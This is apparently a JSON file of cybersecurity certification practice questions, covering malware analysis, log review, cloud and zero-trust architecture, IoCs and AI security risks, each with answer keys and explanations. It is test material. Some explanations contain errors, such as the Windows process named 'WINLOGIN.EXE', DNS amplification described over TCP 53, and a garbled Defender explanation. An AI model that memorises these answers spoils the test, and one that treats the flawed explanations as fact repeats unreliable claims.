syntax"},{"id":"d1-194","set":"d1","ch":3,"d":1,"q":"Sameer wants to create a signature based on malware he has encountered, but he wants to assess other malware that may be from the same source with a strong resemblance to the package he is reviewing. What tool should he use?","o":["Suricata","Wireshark","YARA","Joe Sandbox"],"a":2,"e":"YARA is a popular tool used for malware analysis that is used to identify and classify malware based on patterns found in the malware like strings and hexadecimal sequences. YARA rules can help identify malware packages that are polymorphic but that share underlying features or components. Suricata is an IDS and IPS tool, so it can detect malware, but pattern matching like this is not what Suricata is designed to do. Wireshark is a packet capture tool, and Joe Sandbox is a sandbox for testing malware, not a pattern matching tool for doing static analysis of files.","l":"c3-filesandbox","l2":"","k":"YARA rules"},{"id":"d1-195","set":"d1","ch":3,"d":1,"q":"Vlad believes that an attacker may have added accounts and attempted to obtain extra rights on a Linux workstation. Which of the following is not a common way to check for unexpected accounts like this?","o":["Review <code>/etc/passwd</code> and <code>/etc/shadow</code> for unexpected accounts.","Check <code>/home/</code> for new user directories.","Review <code>/etc/sudoers</code> for unexpected accounts.","Check <code>/etc/groups</code> for group membership issues."],"a":1,"e":"It is unlikely that skilled attackers will create a new home directory for an account they want to hide. Checking <code>/etc/password</code> and <code>/etc/shadow</code> for new accounts is a quick way to detect unexpected accounts, and checking both the <code>sudoers</code> and membership in wheel and other high-privilege groups can help Vlad detect unexpected accounts with increased privileges.","l":"c3-host","l2":"c2-os","k":"detecting unauthorized Linux accounts"},{"id":"d1-196","set":"d1","ch":3,"d":1,"q":"Ben is working with three files from a compromised machine. He needs to categorize them based on their likely purpose based on their format. How should he categorize these three files?<ol class=\"decimal\" start=\"1\">\n<li>A file named <code>docker-compose.yml</code> that uses indentation and colons as it defines services and configuration values</li>\n<li>A file named <code>payload.json</code> that is structured with curly brackets and key-value pairs</li>\n<li>A file named <code>secevents.evtx</code> that is binary encoded</li>\n</ol>","o":["<code>docker-compose.yml</code> is a binary log file, <code>payload.json</code> is a written in a tag-based markup language, and <code>secevents.evtx</code> is a human-readable configuration file.","<code>docker-compose.yml</code> is a human-readable configuration file, <code>payload.json</code> is a file arranged in a data-interchange format, and <code>secevents.evtx</code> is a binary Windows event log file.","<code>docker-compose.yml</code> and <code>payload.json</code> are both files in binary formats, while <code>secevents.evtx</code> is a human-readable text file.","<code>docker-compose.yml</code> uses a tag-based markup language (like XML), <code>payload.json</code> is a configuration file, and <code>secevents.evtx</code> is encoded in a data-interchange format."],"a":1,"e":"YAML is used for human-readable configuration files, JSON is used for modern web APIs to exchange data, and <code>evtx</code> is Microsoft’s binary event format.","l":"c3-tools","l2":"c2-logging","k":"file format identification"},{"id":"d1-197","set":"d1","ch":3,"d":1,"q":"While investigating a spam email, Adam is able to capture headers from one of the email messages that was received. He notes that the sender was Carmen Victoria Garci. What facts can he gather from the headers shown here?\n<figure><img alt=\"Screenshot details an email address header with authentication results, routing paths, and metadata from July 2017.\" loading=\"lazy\" src=\"img/pt/c01un016.png\"/></figure>","o":["Victoria Garci’s email address is <code><a href=\"mailto:tntexpress819@yahoo.com\">tntexpress819@yahoo.com</a></code>.","The sender sent via Yahoo.","The sender sent via a system in Japan.","The sender sent via Gmail."],"a":2,"e":"Headers can be helpful when tracking down spam email, but spammers often use a number of methods to obfuscate the original sender’s IP address, email, or other details. Unfortunately, email addresses are often spoofed, and the email address may be falsified. In this case, the only verifiable information in these headers is the IP address of the originating host, <code>mf-smf-ucb011.ocn.ad.jp (mf-smf-ucb011.ocn.ad.jp) [153.149.228.228]</code>. At times even this detail can be forged, but in most cases, this is simply a compromised host or one with an open email application that spammers can leverage to send bulk email.","l":"c3-filesandbox","l2":"c3-cloud-social","k":"email header analysis"},{"id":"d1-198","set":"d1","ch":3,"d":1,"q":"After submitting a suspected malware package to VirusTotal, Damian receives the following results. What does this tell Damian?\n<figure><img alt=\"Screenshot details a VirusTotal scan with a detection ratio of 55 out of 62 and a list of antivirus engines identifying ransom Trojans.\" loading=\"lazy\" src=\"img/pt/c01un017.png\"/></figure>","o":["The submitted file contains more than one malware package.","Antivirus vendors use different names for the same malware.","VirusTotal was unable to specifically identify the malware.","The malware package is polymorphic, and matches will be incorrect."],"a":1,"e":"Each antivirus or antimalware vendor uses their own name for malware, resulting in a variety of names showing for a given malware package or family. In this case, the malware package is a ransomware package that is known by some vendors as GoldenEye or Petya.","l":"c3-filesandbox","l2":"c3-tip-edr","k":"VirusTotal multiscanner results"},{"id":"d1-199","set":"d1","ch":1,"d":1,"q":"Laura has discovered that one of her developers has created training data for the organization’s AI that allows his requests to bypass security checks. What AI security concern best describes this issue?","o":["Hallucinations","AI model poisoning","Data exposure","Malicious prompts"],"a":1,"e":"The developer’s intentional insertion of training data to cause the AI to respond this way makes this an example of AI model poisoning. Hallucinations would involve incorrect responses or made-up data, data exposure exposes data that shouldn’t be exposed, and malicious prompts require users to ask the AI for things it shouldn’t do.","l":"c1-ai","l2":"c7-web-ot","k":"AI model poisoning"},{"id":"d1-200","set":"d1","ch":2,"d":1,"q":"Nara is reviewing event logs to determine who has accessed a workstation after business hours. When she runs <code>secpol.msc</code> on the Windows system she is reviewing, she sees the following settings. What important information will be missing from her logs?\n<figure><img alt=\"Screenshot details a Local Security Policy window with Account Logon settings and Audit Credential Validation set to Failure.\" loading=\"lazy\" src=\"img/pt/c01un018.png\"/></figure>","o":["Login failures","User IDs from logins","Successful logins","Times from logins"],"a":2,"e":"The system Nara is reviewing has only login failure logging turned on and will not capture successful logins. She cannot rely on the logs to show her who logged in but may be able to find other forensic indicators of activity, including changes in the user profile directories and application caches.","l":"c2-logging","l2":"c3-tools","k":"Windows audit policy configuration"},{"id":"d1-201","set":"d1","ch":3,"d":1,"q":"Profiling networks and systems can help to identify unexpected activity. What type of detection can be used once a profile has been created?","o":["Dynamic analysis","Anomaly analysis","Static analysis","Behavioral analysis"],"a":3,"e":"Profiling networks and systems will provide a baseline behavior set. A SIEM or similar system can monitor for differences or anomalies that are recorded as events. Once correlated with other events, these can be investigated and may prove to be security incidents. Dynamic and static analyses are types of code analysis, whereas behavioral, or heuristic, analysis focuses on behaviors that are indicative of an attack or other undesirable behavior. Behavioral analysis does not require a baseline; instead, it requires knowing what behavior is not acceptable.","l":"c3-uba-scripting","l2":"c3-network","k":"anomaly vs behavioral analysis"},{"id":"d1-202","set":"d1","ch":1,"d":1,"q":"Sally wants to establish AI usage policies for her organization. Which of the following is the most significant security risk that she should address when considering the use of third-party LLMs?","o":["Employees may upload sensitive internal data that will be used to train models.","Employees may become over-reliant on AI to do their work.","Employees may receive incorrect answers due to hallucinations.","The third-party tool may change, resulting in differences in performance or function."],"a":0,"e":"Data exposure is a significant concern with third-party LLMs, and organizations are increasingly attempting to address this through contractual language or by running their own internal LLMs. Employee reliance on LLMs is a staffing and management risk, not directly a security risk. Hallucinations and model updates that aren’t handled appropriately could cause operational or business issues, but they are not directly a security risk either.","l":"c1-ai","l2":"","k":"LLM data exposure risks"},{"id":"d1-203","set":"d1","ch":1,"d":1,"q":"Selah wants to implement AI for use in her security organization. Which of the following is not a common use case of AI for security purposes?","o":["Creating summary documents based on incident notes","Forensic analysis requiring a chain of custody","Comparing IoCs to determine their similarities","Analyzing log files to identify correlations"],"a":1,"e":"Currently, AI is not typically used for forensic analysis that will be provided in court like those that require a chain of custody to be documented. AI is frequently used to create documents, compare files and documents, and to analyze logs.","l":"c1-ai","l2":"c10-evidence","k":"AI security use cases"},{"id":"d1-204","set":"d1","ch":1,"d":1,"q":"Syslog, APIs, email, STIX/TAXII, and database connections are all examples of what for a SOAR?","o":["IOCs","Methods of data ingestion","SCAP connections","Attack vectors"],"a":1,"e":"SOAR systems offer many ways to ingest data, and syslog, APIs, email, STIX/TAXII feeds, and database connections are all common ways for data to be acquired.","l":"c1-efficiency","l2":"c2-logging","k":"SOAR data ingestion methods"},{"id":"d1-205","set":"d1","ch":1,"d":1,"q":"Nick’s U.S.-based organization is planning to adopt an AI hiring tool that leverages years of his organization’s hiring data as training materials. His organization’s AI governance team has raised concerns about this plan. What potential legal issue are they most likely to raise?","o":["The existing hiring data may retain human biases, potentially in violation of existing equal opportunity laws.","The AI model may suffer from the potential of injection attacks, resulting in some applicants getting an unfair advantage.","The AI model may hallucinate during the review, providing some candidates with advantages.","The model may expose résumé data belonging to candidates, leading to privacy law concerns."],"a":0,"e":"Nick should be concerned about existing biases being reinforced through the use of historic data, essentially inadvertently poisoning the model. Injection attacks are not a direct legal concern, but they are a security concern. Hallucinations are possible, but they are not a significant concern in most well-trained models used for purposes like this. Résumés and other information are unlikely to be considered private.","l":"c1-ai","l2":"","k":"AI training bias and legal risks"},{"id":"d1-206","set":"d1","ch":1,"d":1,"q":"Ron’s organization uses AWS infrastructure as code tools to manage their fleet of web servers. The servers are part of an AWS Auto Scaling group, and rely on CloudFormation and an AMI to instantiate servers that are then customized with their individual settings like IP address and hostname as part of the scaling group configuration. What should Ron do to most effectively deploy a patch to remediate a recently discovered vulnerability?","o":["Point the CloudFormation template to a new, patched AMI, then conduct a rolling replacement of the servers.","SSH into each of the impacted servers and run updates to install the patch.","Terminate the instances one at a time to allow them to re-scale with updated instances on boot.","Use an AWS Config rule to patch servers as they are launched."],"a":0,"e":"Using CloudFormation to deploy a patched “golden” AMI fixes the issue now and in the future, and allows load to be handled without disruption. This avoids manual efforts like SSH’ing into all of the servers or terminating instances one at a time and focuses on a core infrastructure as a code concept of updating once as part of infrastructure, unlike the Config rule option.","l":"c1-endpoint-pentest","l2":"c2-infra","k":"IaC golden AMI patch deployment"},{"id":"d1-207","set":"d1","ch":3,"d":1,"q":"While investigating a compromise, Jack discovers four files that he does not recognize and believes may be malware. What can he do to quickly and effectively check the files to see whether they are malware?","o":["Submit them to a site like VirusTotal.","Open them using a static analysis tool.","Run strings against each file to identify common malware identifiers.","Run a local antivirus or antimalware tool against them."],"a":0,"e":"Online tools like VirusTotal, MetaScan, and other online malware scanners use multiple antivirus and antimalware engines to scan files. This means they can quickly identify many malware packages. Static analysis of malware code is rarely quick and requires specialized knowledge to unpack or deobfuscate the files in many cases. Running strings can be helpful to quickly pick out text if the code is not encoded in a way that prevents it, but it’s not a consistently useful technique. Running local antivirus or antimalware can be helpful but has a lower success rate than a multi-engine tool.","l":"c3-filesandbox","l2":"","k":"multi-engine online malware scanners"},{"id":"d1-208","set":"d1","ch":3,"d":1,"q":"Brian wants to detect unauthorized software that isn’t malware, but he isn’t allowed by organizational policy in his Windows domain. Which of the following tools will best allow him to detect it?","o":["Windows Defender Antivirus","Microsoft Configuration Manager","Nmap","RDP"],"a":1,"e":"Microsoft Configuration Manager can be used to manage Windows systems in a domain, including monitoring installed software. Windows Defender Antivirus Microsoft Defender Antivirus (formerly known as Windows Defender) is a comprehensive, built-in security suite that comes preinstalled with Windows 10 and 11. It provides real-time protection against malware, including viruses, ransomware, and spyware, without requiring a separate installation or subscription. Nmap is a port scanner and would only find software that opened a service port. RDP is a remote access tool.","l":"c3-host","l2":"c1-endpoint-pentest","k":"unauthorized software detection"},{"id":"d1-209","set":"d1","ch":3,"d":1,"q":"Adam is investigating a phishing email that was reported to his team. After review, he finds that the source IP address <code>93.99.104.253</code> for the email is listed on MXToolbox’s blacklist, but also has many more blacklists that it is not on. What can he determine from this data point?\n<figure><img alt=\"Screenshot lists I P address checked against 61 blacklists with 6 results marked as Listed and details for reason, T T L, and response time.\" loading=\"lazy\" src=\"img/pt/c01un019.png\"/></figure>","o":["The system has been identified as sending unwanted traffic and is blacklisted.","The system may have been previously blacklisted.","The system state is unknown.","The system has a history of sending unwanted traffic but is not currently sending spam."],"a":0,"e":"The system has been identified by multiple blacklists as sending unwanted traffic and is currently blacklisted. What Adam can’t determine is its history, and whether the system is currently sending spam or is just waiting to be removed after being remediated.","l":"c3-tip-edr","l2":"c3-filesandbox","k":"IP and DNS blacklists"},{"id":"d1-210","set":"d1","ch":4,"d":1,"q":"Samantha is preparing a report describing the common attack models used by advanced persistent threat actors. Which of the following is a typical characteristic of APT attacks?","o":["They involve sophisticated DDoS attacks.","They quietly gather information from compromised systems.","They rely on worms to spread.","They use encryption to hold data hostage."],"a":1,"e":"Advanced persistent threats often leverage email, phishing, or a vulnerability to access systems and insert malware. Once they have gained a foothold, APT threats typically work to gain access to more systems with greater privileges. They gather data and information and then exfiltrate that information while working to hide their activities and maintain long-term access. DDoS attacks, worms, and encryption-based extortion are not typical APT behaviors.","l":"c4-classify","l2":"","k":"APT attack characteristics"},{"id":"d1-211","set":"d1","ch":3,"d":1,"q":"Charles receives an AWS Guard Duty alert indicating potential exfiltration of data on an S3 bucket used to store sensitive company data. Which of the following symptoms is most likely to trigger this type of alert?","o":["High volumes of upload traffic to the S3 bucket","High volumes of download traffic from the S3 bucket","High CPU load on the related EC2 instance","Port scans of the S3 bucket followed by connection attempts"],"a":1,"e":"Exfiltration attempts are most often associated with data leaving an organization, so large volumes of data pulled from an S3 bucket to unexpected destinations or in atypical volumes could trigger an alert. Uploads aren’t a typical issue for exfiltration. CPU loads on an EC2 instances are more common for cryptojacking or denial of service instead of exfiltration, and S3 buckets don’t present services directly, making a vulnerability scan and connection attempt an alert you wouldn’t see for an object storage bucket.","l":"c3-cloud-social","l2":"c3-network","k":"cloud storage data exfiltration indicators"},{"id":"d1-212","set":"d1","ch":3,"d":1,"q":"Bethany is a security administrator for a company that uses Azure Active Directory to manage identities. She notices a series of events, including:<ol class=\"decimal\" start=\"1\">\n<li>A successful login for a member of her organization’s AD management team at 21:30 UTC from the corporate headquarters in Chicago, IL.</li>\n<li>A successful login for the same user ID from Beijing, China at 23:30 UTC.</li>\n<li>An Azure event log listing the addition of a new user to the Global Administrator role for the company’s VPN group.</li></ol>\n<p>What should Bethany identify this issue as?</p>","o":["IAM user compromise followed by VPN usage","Impossible travel followed by an IAM user compromise","A successful phishing attack followed by an IAM user compromise","A service disruption followed by impossible travel"],"a":1,"e":"The two logins are from locations where it would be physically impossible to travel between in the time between logins. The immediate use of administrative credentials to add a new user to an administrative group indicates a likely IAM user compromise. No VPN usage is mentioned, although that’s a likely next step. No phishing attack is described, not is there a service disruption in the question.","l":"c3-cloud-social","l2":"","k":"impossible travel indicator"},{"id":"d1-213","set":"d1","ch":5,"d":1,"q":"Greg suspects that an attacker is running an SSH server on his network over a nonstandard port. What port is normally used for SSH communications?","o":["21","22","443","444"],"a":1,"e":"SSH communications normally take place over TCP port 22. Attackers may try to run SSH servers over different ports to avoid detection.","l":"c5-portscan","l2":"","k":"standard SSH port"},{"id":"d1-214","set":"d1","ch":3,"d":1,"q":"Amanda is reviewing the security of a system that was previously compromised. She is searching for signs that the attacker has achieved persistence on the system. Which one of the following should be her highest priority to review?","o":["Scheduled tasks","Network traffic","Running processes","Application logs"],"a":0,"e":"Attackers commonly use scheduled tasks to achieve persistence. If an analyst forgets to check for scheduled tasks, attackers may leave a task scheduled that opens up a vulnerability at a later date, achieving persistence on the system.","l":"c3-host","l2":"","k":"scheduled tasks persistence"},{"id":"d1-215","set":"d1","ch":2,"d":1,"q":"Brendan is reviewing a series of syslog entries and notices several with different logging levels. Which one of the following messages should he review first?","o":["Level 0","Level 1","Level 5","Level 7"],"a":0,"e":"Syslog levels identify the urgency of the message and are numbered from 0 through 7. The highest level is level 0, which is designated as an emergency message. Syslog level 1 messages are alerts, level 2 messages are critical messages, level 3 messages are errors, level 4 messages are warnings, level 5 messages are notices, level 6 messages are informational, and level 7 is for debugging messages.","l":"c2-logging","l2":"","k":"syslog severity levels"},{"id":"d1-216","set":"d1","ch":2,"d":1,"q":"You are looking for operating system configuration files that are stored on a Linux system. Which one of the following directories is most likely to contain those files?","o":["<code>/bin</code>","<code>/</code>","<code>/etc</code>","<code>/dev</code>"],"a":2,"e":"The <code>/etc</code> directory normally contains system-level configuration files. Files are generally not stored at the root level (<code>/</code>) of a filesystem. The <code>/bin</code> directory is used for binary executables, and the <code>/dev</code> directory is used for devices.","l":"c2-os","l2":"","k":"Linux configuration file locations"},{"id":"d1-217","set":"d1","ch":2,"d":1,"q":"Which one of the following is not a standard Windows system process?","o":["<code>SERVICES.EXE</code>","<code>MALWARESCAN.EXE</code>","<code>WINLOGIN.EXE</code>","<code>LSASS.EXE</code>"],"a":1,"e":"<code>MALWARESCAN.EXE</code> is not a standard Windows system process and should be investigated if found on a system. <code>SERVICES.EXE</code> is the Windows Service Control Manager. <code>WINLOGIN.EXE</code> is the Windows Login Process. <code>LSASS.EXE</code> is the Local Security Authority Subsystem Service.","l":"c2-os","l2":"c3-host","k":"standard Windows system processes"},{"id":"d1-218","set":"d1","ch":3,"d":1,"q":"Charleen’s SIEM alerts on an event involving a single user account in an Office 365 tenant downloading over 1,000 files from an internal document repository related to a critical project that the user is not associated with. What should she identify this event as?","o":["Use of LOLBins","Service disruption","Potential data exfiltration","A possible IAM account compromise"],"a":2,"e":"With large amounts of data downloaded from a project repository that isn’t typically accessed Charleen knows this could be a data exfiltration event. LOLBins are local binaries used by attackers as they “live off the land” using tools already available on systems to conduct their activities. No service is described as being disrupted, and the account is not described as an IAM account.","l":"c3-host","l2":"c3-cloud-social","k":"data exfiltration detection"},{"id":"d1-219","set":"d1","ch":7,"d":1,"q":"What is the primary difference in function between a typical SCADA system and other ICS components like a PLC?","o":["A SCADA system is designed for supervisory monitoring and data acquisition, whereas a PLC is designed for direct, real-time control of a specific machine.","A SCADA system can only use proprietary communication protocols, whereas a PLC uses open source protocols like TCP/IP.","A SCADA system is physical hardware, whereas a PLC is a software application.","A SCADA system is considered a cloud system, whereas a PLC is an on-premises system."],"a":0,"e":"SCADA systems monitors and controls devices for industrial processes, whereas a PLC or programable logic controller directly controls a device or machine. SCADA and PLCs often use TCP/IP, but may use proprietary protocols as well. SCADA is software, and PLCs are hardware. SCADA and PLCs are typically on-premises, but cloud SCADA is possible.","l":"c7-web-ot","l2":"c2-infra","k":"SCADA versus PLC functions"},{"id":"d1-220","set":"d1","ch":2,"d":1,"q":"Matthew is reviewing a new cloud service offering that his organization plans to adopt. In this offering, a cloud provider will create virtual server instances under the multitenancy model. Each server instance will be accessible only to Matthew’s company. What cloud deployment model is being used?","o":["Hybrid cloud","Public cloud","Private cloud","Community cloud"],"a":1,"e":"The key to answering this question is recognizing that the multitenancy model involves many different customers accessing cloud resources hosted on shared hardware. That makes this a public cloud deployment, regardless of the fact that access to a particular server instance is limited to Matthew’s company. In a private cloud deployment, only Matthew’s company would have access to any resources hosted on the same physical hardware. This is not multitenancy. There is no indication that Matthew’s organization is combining resources of public and private cloud computing, which would be a hybrid cloud, or that the resource use is limited to members of a particular group, which would be a community cloud.","l":"c2-netarch","l2":"c2-infra","k":"public cloud multitenancy model"},{"id":"d1-221","set":"d1","ch":2,"d":1,"q":"In a zero-trust network architecture, what criterion is used to make trust decisions?","o":["Identity of a user or device","IP address","Network segment","VLAN membership"],"a":0,"e":"Zero-trust network architectures make trust decisions based on the identity of the user or device making the request. They do not make trust decisions based on network location characteristics, such as an IP address, VLAN assignment, or network segment, but they do make decisions based on context. It doesn’t implicitly trust location, for example but, given other factors, can include location in a trust decision.","l":"c2-netarch","l2":"c2-iam","k":"zero trust trust decisions"},{"id":"d1-222","set":"d1","ch":2,"d":1,"q":"Lynn’s organization is moving toward a secure access service edge (SASE) approach to security. Which one of the following technologies is least likely to be included in a SASE architecture?","o":["NGFW","CASB","Hypervisor","WAN"],"a":2,"e":"Secure access service edge (SASE) approaches to network security seek to implement zero-trust networking in a way that integrates cloud security services. Next-generation firewalls (NGFWs), cloud access security brokers (CASBs), and wide area network (WAN) connections are all critical components of SASE deployments. Hypervisors are used to create virtual machines, and while they may be leveraged in a SASE environment, they are not themselves a direct part of the SASE architecture.","l":"c2-netarch","l2":"","k":"SASE architecture components"},{"id":"d1-223","set":"d1","ch":3,"d":1,"q":"Marco is the SOC analyst on duty when the organization’s monitoring tools alert because his organization’s outbound link is completely saturated. When he investigates using a packet capture tool he notices an extreme volume of inbound traffic on TCP port 53 coming from thousands of hosts. Which of the following IoCs are most likely to be associated with this event?","o":["A typosquatting attack","A DNS reflection and amplification attack","A SQL injection attack","A distributed web-based DDoS"],"a":1,"e":"Marco knows that DNS operates on TCP port 53, and that amplification attacks can involve hundreds or thousands of servers that amplify the attack. His amplified DNS DDoS IoC should match this behavior. There is no indication of typosquatting, as traffic impacting his organization would likely be leaving rather than entering. SQL traffic operates on port 1433, and web traffic is typically on TCP 80 or 443.","l":"c3-network","l2":"","k":"DNS amplification attack"},{"id":"d1-224","set":"d1","ch":2,"d":1,"q":"During their organization’s incident response preparation, Manish and Linda are identifying critical information assets that the company uses. Included in their organizational datasets is a list of customer names, addresses, phone numbers, and demographic information. How should Manish and Linda classify this information?","o":["PII","Intellectual property","PHI","PCI DSS"],"a":0,"e":"Personally identifiable information (PII) includes information that can be used to identify, contact, or locate a specific individual. At times, PII must be combined with other data to accomplish this but remains useful for directly identifying an individual. The data that Manish and Linda are classifying is an example of PII. PHI is personal health information. Intellectual property is the creation of human minds including copyrighted works, inventions, and other similar properties. PCI DSS is the Payment Card Industry Data Security Standards.","l":"c2-crypto","l2":"c1-objectives","k":"personally identifiable information classification"},{"id":"d1-225","set":"d1","ch":2,"d":1,"q":"Randy wants to ensure that only authorized users use his organization’s API. What should he require to use his API?","o":["API keys","API firewalls","An internal API","API rate limits"],"a":0,"e":"API keys are used to authenticate and authorize users or services that call an API. Randy will still need to make sure his API keys aren’t exposed or shared, but they’re the most common way to accomplish what he wants to do. Web application firewalls protect APIs by blocking threats but don’t fill the same niche for authentication and authorization. There’s no information about internal or external users, so an internal API may or may not fit the need. API rate limits help prevent abuse but don’t stop unauthorized users by themselves.","l":"c2-infra","l2":"c2-iam","k":"API authentication and keys"},{"id":"d1-226","set":"d1","ch":3,"d":1,"q":"Derek sets up a series of virtual machines that are automatically created in a completely isolated environment. Once created, the systems are used to run potentially malicious software and files. The actions taken by those files and programs are recorded and then reported. What technique is Derek using?","o":["Sandboxing","Reverse engineering","Malware disassembly","Darknet analysis"],"a":0,"e":"Derek has created a malware analysis sandbox and may opt to use tools like Cuckoo, Truman, Minibis, or a commercial analysis tool. If Derek pulls apart the files to analyze how they work, he would be engaging in reverse engineering, and doing code-level analysis of executable malware would require disassembly. Darknets are used to identify malicious traffic and aren’t used in this way.","l":"c3-filesandbox","l2":"","k":"malware analysis sandboxing"},{"id":"d1-227","set":"d1","ch":3,"d":1,"q":"Jill wants to write a Snort rule that will detect potential beaconing traffic from a known IoC. The beacon includes the text “Check-in,” and is sent from the server via TCP 80. Which of the following rules will properly detect this?","o":["<code>alert tcp $EXTERNAL_NET any -&gt; 10.10.10.1 80 (flow:to_server,established; … )</code>","<code>alert tcp $EXTERNAL_NET any -&gt; any 80 (flow:to_server,established; … )</code>","<code>alert tcp any 80 -&gt; $EXTERNAL_NET any (flow:to_client,established; … )</code>","<code>alert tcp any -&gt; $EXTERNAL_NET any 80 (flow:to_client,established; … )</code>"],"a":2,"e":"Jill wants a rule that will detect flow from any internal client on TCP 80. There isn’t an internal IP address specified, so the 10.10.10.1 can be dismissed. Flows from external sources aren’t what is described. Finally, the internal source port of TCP 80 is important, not an external source port of 80.","l":"c3-tools","l2":"c3-network","k":"Snort rule syntax"},{"id":"d1-228","set":"d1","ch":4,"d":1,"q":"Tanya is creating an open source intelligence operation for her organization. Which one of the following sources would she be least likely to use in this work?","o":["Web server logs","Dark websites","Government bulletins","Social media"],"a":0,"e":"Open source collection initiatives use publicly available information. This may be found in government bulletins, on the web (even the Dark Web!), or on social media. Web server logs are generally not public information and would, therefore, be considered closed source rather than open source sources.","l":"c4-collect","l2":"","k":"open source intelligence sources"},{"id":"d1-229","set":"d1","ch":4,"d":1,"q":"Mark wants to create a security tool that ingests IoC data. If he wants to use an easily human-readable format that will be easily compatible with existing IoC data formats, which of the following should he choose?","o":["EVTX","SOAP","XML","HTML"],"a":2,"e":"Existing IoC data formats like STIX use XML, so using an XML format would make the most sense for Mark’s needs. HTML is used for websites, but a markup language like XML is more common for this purpose. SOAP is a messaging protocol used for exchanging XML data but isn’t a data format itself, and EVTX is a binary format and thus isn’t natively human readable.","l":"c4-collect","l2":"c4-hunt","k":"STIX and IoC data formats"},{"id":"d1-230","set":"d1","ch":4,"d":1,"q":"Ian knows the hash value for a malware package. What type of IoC is this?","o":["A behavioral IoC","An ephemeral IoC","A procedural IoC","An atomic IoC"],"a":3,"e":"This is an example of an atomic IoC. It is an individual, specific data point about an indicator. Behavioral IoCs describe how threats or threat actors conduct their operations. Ephemeral and procedural IoCs are not terms used as part of the CySA+ exam outline.","l":"c4-hunt","l2":"","k":"atomic IoC"},{"id":"d1-231","set":"d1","ch":4,"d":1,"q":"The ATT&amp;CK framework defines which of the following as “the specifics behind how the adversary would attack the target”?","o":["The threat actor","The targeting method","The attack vector","The organizational weakness"],"a":2,"e":"The ATT&amp;CK framework defines the attack vector as the specifics behind how the adversary would attack the target. You don’t have to memorize ATT&amp;CK to pass the exam, but you should be prepared to encounter questions that you need to narrow down based on what knowledge you do have. Here you can rule out the threat actor and targeting method and then decide between the attack vector and organizational weakness.","l":"c4-classify","l2":"c9-frameworks","k":"ATT&CK attack vector"},{"id":"d1-232","set":"d1","ch":4,"d":1,"q":"Kevin discovers that one of his co-workers is running a password stealer on a shared conference room PC. When confronted, the co-worker explains that he was trying to gather information to get revenge on a bad boss. What kind of threat is this?","o":["An insider threat","An APT","Organized crime","A hacktivist"],"a":0,"e":"Threats from employees are considered internal threats, regardless of the motivation. An APT is an advanced persistent threat, often sponsored by a nation-state. Organized crime is not involved, and while the individual is unhappy, this is not hacktivism or hacking for political or activism reasons.","l":"c4-classify","l2":"","k":"insider threat actor"},{"id":"d1-233","set":"d1","ch":2,"d":1,"q":"Brian is selecting a CASB for his organization, and he would like to use an approach that interacts with the cloud provider directly. Which CASB approach is most appropriate for his needs?","o":["Inline CASB","Outsider CASB","Comprehensive CASB","API-based CASB"],"a":3,"e":"API-based CASB solutions interact directly with the cloud provider through the provider’s API. Inline CASB solutions intercept requests between the user and the provider. Outsider and comprehensive are not categories of CASB solutions.","l":"c2-infra","l2":"c2-netarch","k":"API-based CASB"},{"id":"d1-234","set":"d1","ch":2,"d":1,"q":"Sherry is deploying a zero-trust network architecture for her organization. In this approach, which one of the following characteristics would be least important in validating a login attempt?","o":["User identity","IP address","Geolocation","Nature of requested access"],"a":1,"e":"The defining characteristic of zero-trust network architecture is that trust decisions are not based on network location, such as IP address. It is appropriate to use other characteristics, such as a user’s identity, the nature of the requested access, and the user’s geographic (not network!) location.","l":"c2-netarch","l2":"","k":"zero trust network architecture"},{"id":"d1-235","set":"d1","ch":2,"d":1,"q":"Lisa wants to integrate with a cloud identity provider that uses OAuth 2.0, and she wants to select an appropriate authentication framework. Which of the following best suits her needs?","o":["OpenID Connect","SAML","RADIUS","Kerberos"],"a":0,"e":"OpenID Connect is an authentication layer that works with OAuth 2.0 as its underlying authorization framework. It has been widely adopted by cloud service providers and is widely supported. SAML, RADIUS, and Kerberos are alternative authentication technologies but do not have the same level of seamless integration with OAuth.","l":"c2-federation","l2":"c2-iam","k":"OpenID Connect and OAuth"},{"id":"d1-236","set":"d1","ch":5,"d":1,"q":"Which lookup tool provides information about a domain’s registrar and physical location?","o":["<code>nslookup</code>","<code>host</code>","WHOIS","<code>traceroute</code>"],"a":2,"e":"WHOIS provides information that can include the organization’s physical address, registrar, contact information, and other details. <code>nslookup</code> will provide IP address or hostname information, whereas host provides IPv4 and IPv6 addresses as well as email service information. <code>traceroute</code> attempts to identify the path to a remote host as well as the systems along the route.","l":"c5-recon","l2":"","k":"WHOIS domain lookup"},{"id":"d1-237","set":"d1","ch":4,"d":1,"q":"Vince recently received the hash values of malicious software that several other firms in his industry found installed on their systems after a compromise. What term best describes this information?","o":["Vulnerability feed","IoC","TTP","RFC"],"a":1,"e":"Specific details of attacks that may be used to identify compromises are known as indicators of compromise (IoC). This data may also be described as an adversary tool, tactic, or procedure (TTP), but the fact that it is a set of file signatures makes it more closely match the definition of an IoC.","l":"c4-hunt","l2":"","k":"indicators of compromise"},{"id":"d1-238","set":"d1","ch":2,"d":1,"q":"A PIN is an example of what type of authentication factor?","o":["Something you know","Something you are","Something you have","Something you set"],"a":0,"e":"PINs and passwords are both examples of something you know. Biometric factors are an example of something you are, and a physical USB token would be a common example of something you have. Something you set is not a type of authentication factor.","l":"c2-iam","l2":"","k":"authentication factor types"},{"id":"d1-239","set":"d1","ch":2,"d":1,"q":"Brian recently joined an organization that runs the majority of its services on a virtualization platform located in its own datacenter but also leverages an IaaS provider for hosting its web services and an SaaS email system. What term best describes the type of cloud environment this organization uses?","o":["Public cloud","Dedicated cloud","Private cloud","Hybrid cloud"],"a":3,"e":"The scenario describes a mix of public cloud and private cloud services. This is an example of a hybrid cloud environment.","l":"c2-netarch","l2":"c2-infra","k":"hybrid cloud architecture"},{"id":"d1-240","set":"d1","ch":4,"d":1,"q":"What type of tools are listed as “annoying” in the Pyramid of Pain?","o":["Tools","Network/host artifacts","Domain names","IP addresses"],"a":1,"e":"Network and host artifacts are listed as “annoying” in the Pyramid of Pain. Tools are considered challenging, domain names are simple, and IP addresses are easy.","l":"c4-classify","l2":"","k":"Pyramid of Pain"},{"id":"d1-241","set":"d1","ch":4,"d":1,"q":"Which of the following threat actors typically has the greatest access to resources?","o":["Nation-state actors","Organized crime","Hacktivists","Insider threats"],"a":0,"e":"Nation-state actors are government sponsored and typically have the greatest access to resources including tools, money, and talent.","l":"c4-classify","l2":"","k":"threat actor resource levels"},{"id":"d1-242","set":"d1","ch":4,"d":1,"q":"Which one of the following information sources would not be considered an OSINT source?","o":["DNS lookup","Search engine research","Port scans","WHOIS queries"],"a":2,"e":"Port scans are an active reconnaissance technique that probe target systems and would not be considered open source intelligence (OSINT). Search engine research, DNS 